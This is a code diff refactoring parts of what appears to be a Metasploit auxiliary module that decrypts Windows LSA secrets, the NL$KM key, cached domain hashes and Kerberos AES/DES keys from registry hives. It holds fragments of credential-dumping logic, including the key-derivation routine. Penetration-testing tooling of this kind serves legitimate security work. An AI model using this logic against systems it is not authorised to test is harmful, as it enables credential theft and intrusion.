@@ -501,7 +501,7 @@ class MetasploitModule < Msf::Auxiliary
   def get_lsa_secret_key(reg_parser, boot_key)
     print_status('Decrypting LSA Key')
     vprint_status('Getting PolEKList...')
-    _value_type, value_data = reg_parser.get_value('\\Policy\\PolEKList', 'default')
+    _value_type, value_data = reg_parser.get_value('\\Policy\\PolEKList')
     if value_data
       vprint_status('Vista or above system')
 
@@ -509,7 +509,7 @@ class MetasploitModule < Msf::Auxiliary
       lsa_key = lsa_key[68,32] unless lsa_key.empty?
     else
       vprint_status('Getting PolSecretEncryptionKey...')
-      _value_type, value_data = reg_parser.get_value('\\Policy\\PolSecretEncryptionKey', 'default')
+      _value_type, value_data = reg_parser.get_value('\\Policy\\PolSecretEncryptionKey')
       # If that didn't work, then we're out of luck
       return nil if value_data.nil?
 
@@ -535,7 +535,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_nlkm_secret_key(reg_parser, lsa_key)
     print_status('Decrypting NL$KM')
-    _value_type, value_data = reg_parser.get_value('\\Policy\\Secrets\\NL$KM\\CurrVal', 'default')
+    _value_type, value_data = reg_parser.get_value('\\Policy\\Secrets\\NL$KM\\CurrVal')
     return nil unless value_data
 
     if lsa_vista_style?
@@ -668,7 +668,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if hashes.empty?
-        print_line('No cached hashes on this system')
+      print_line('No cached hashes on this system')
     else
       print_status("Hash#{'es' if hashes.lines.size > 1} are in '#{lsa_vista_style? ? 'mscash2' : 'mscash'}' format")
       print_line(hashes)
@@ -768,39 +768,26 @@ class MetasploitModule < Msf::Auxiliary
     ].include?(key)
   end
 
-  def aes256_cts_hmac_sha1_96_key(raw_secret, salt)
-    iterations = 4096
-    key_len = 32
-    key = OpenSSL::PKCS5.pbkdf2_hmac_sha1(raw_secret, salt, iterations, key_len)
-    plaintext = "kerberos\x7B\x9B\x5B\x2B\x93\x13\x2B\x93".b
-    rnd_seed = ''.b
-    loop do
-      cipher = OpenSSL::Cipher.new('AES-256-CBC')
-      cipher.encrypt
-      cipher.iv = "\x00".b * 16
-      cipher.key = key
-      ciphertext = cipher.update(plaintext)
-      rnd_seed += ciphertext
-      break unless rnd_seed.size < 32
-      plaintext = ciphertext
+  def aes_cts_hmac_sha1_96_key(raw_secret, salt, key_len)
+    if key_len == 16
+      algo = 'AES-128-CBC'
+    elsif key_len == 32
+      algo = 'AES-256-CBC'
+    else
+      raise ArgumentError, 'Key length should be 16 or 32'
     end
-    rnd_seed.unpack('H*')[0]
-  end
-
-  def aes128_cts_hmac_sha1_96_key(raw_secret, salt)
     iterations = 4096
-    key_len = 16
     key = OpenSSL::PKCS5.pbkdf2_hmac_sha1(raw_secret, salt, iterations, key_len)
     plaintext = "kerberos\x7B\x9B\x5B\x2B\x93\x13\x2B\x93".b
     rnd_seed = ''.b
     loop do
-      cipher = OpenSSL::Cipher.new('AES-128-CBC')
+      cipher = OpenSSL::Cipher.new(algo)
       cipher.encrypt
       cipher.iv = "\x00".b * 16
       cipher.key = key
       ciphertext = cipher.update(plaintext)
       rnd_seed += ciphertext
-      break unless rnd_seed.size < 16
+      break unless rnd_seed.size < key_len
       plaintext = ciphertext
     end
     rnd_seed.unpack('H*')[0]
@@ -851,8 +838,8 @@ class MetasploitModule < Msf::Auxiliary
 
     raw_secret = raw_secret.dup.force_encoding(Encoding::UTF_16LE).encode(Encoding::UTF_8, invalid: :replace).b
 
-    secret << "aes256-cts-hmac-sha1-96:#{aes256_cts_hmac_sha1_96_key(raw_secret, salt)}"
-    secret << "aes128-cts-hmac-sha1-96:#{aes128_cts_hmac_sha1_96_key(raw_secret, salt)}"
+    secret << "aes256-cts-hmac-sha1-96:#{aes_cts_hmac_sha1_96_key(raw_secret, salt, 32)}"
+    secret << "aes128-cts-hmac-sha1-96:#{aes_cts_hmac_sha1_96_key(raw_secret, salt, 16)}"
     secret << "des-cbc-md5:#{des_cbc_md5(raw_secret, salt)}"
 
     secret
@@ -956,7 +943,7 @@ class MetasploitModule < Msf::Auxiliary
 
     keys.each do |key|
       vprint_status("Looking into #{key}")
-      _value_type, value_data = reg_parser.get_value("\\Policy\\Secrets\\#{key}\\CurrVal", 'default')
+      _value_type, value_data = reg_parser.get_value("\\Policy\\Secrets\\#{key}\\CurrVal")
       encrypted_secret = value_data
       next unless encrypted_secret
 
